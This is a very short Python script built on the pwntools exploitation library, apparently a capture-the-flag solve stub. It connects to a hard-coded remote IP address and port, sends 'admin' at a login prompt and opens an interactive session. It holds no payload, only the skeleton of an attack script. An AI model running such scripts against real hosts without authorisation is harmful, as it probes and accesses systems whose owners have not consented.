from pwn import *

r = remote('122.38.251.9', 30112)

r.recvuntil(b' - Login : ')
r.send(b'admin')

r.interactive()